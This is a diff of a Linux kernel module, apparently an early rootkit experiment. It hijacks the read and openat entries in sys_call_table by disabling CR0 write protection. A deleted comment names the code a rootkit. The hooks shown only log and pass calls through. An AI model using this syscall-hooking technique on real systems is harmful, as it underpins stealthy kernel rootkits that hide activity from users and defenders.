@@ -33,16 +33,16 @@ asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
 	return real_read(fd, buf, count);
 }
 
+asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode){
+	pr_info("openAt called (mkdir?) path:%s\n", pathname);
+	return real_openat(dirfd, pathname, flags, mode);
+}
+
 /*asmlinkage int totallyReal_mkdir(const char __user *pathname, umode_t mode){
 	pr_info("fakeMkdir called!");
 	return oldNR(pathname, mode);
 }
 */
-
-asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode){
-	pr_info("openAt called (mkdir?) path:%s\n", pathname);
-	return real_openat(dirfd, pathname, flags, mode);
-}
 
 int __init loadMod(void){
 	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
@@ -54,8 +54,7 @@ int __init loadMod(void){
 	pr_info("module loaded\n");
 	pr_info("sys_call_table pointer is %p\n", sys_call_table);
 
-	//pr_info("sys_read is of type %s\n", (typeof(sys_read)).name());
-	//pr_info("original read in sys_call_table shown as %p\n", sys_call_table[__NR_read]);
+	//saves original read syscall, injects fake read syscall
 	real_read = (typeof(sys_read) *)sys_call_table[__NR_read];
 	pr_info("original read stored as %p\n", (void*) real_read);
 	CR0_WRITE_UNLOCK({
@@ -63,10 +62,7 @@ int __init loadMod(void){
 	});
 	pr_info("sys_call_table injected with phony_read ptr:%p\n", (void *)sys_call_table[__NR_read]);
 
-
-
-	//pr_info("sys_read is of type %s\n", (typeof(sys_read)).name());
-	//pr_info("original read in sys_call_table shown as %p\n", sys_call_table[__NR_read]);
+	//saves original open syscall, injects fake open syscall
 	real_openat = (typeof(sys_openat) *)sys_call_table[__NR_openat];
 	pr_info("original openat stored as %p\n", (void*) real_openat);
 	CR0_WRITE_UNLOCK({
@@ -74,14 +70,6 @@ int __init loadMod(void){
 	});
 	pr_info("sys_call_table injected with totallyReal_openat ptr:%p\n", (void *)sys_call_table[__NR_openat]);
 
-	/* immediately restores ptr. If uncommented, rootkit is stable (but doesn't work)
-
-	CR0_WRITE_UNLOCK({
-		sys_call_table[__NR_read] = (void *) real_read;
-	});
-	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);
-
-	*/
 	/*
 	pr_info("old __NR_mkdir:%p", sys_call_table[__NR_mkdir]);
 	oldNR = (void*)sys_call_table[__NR_mkdir];
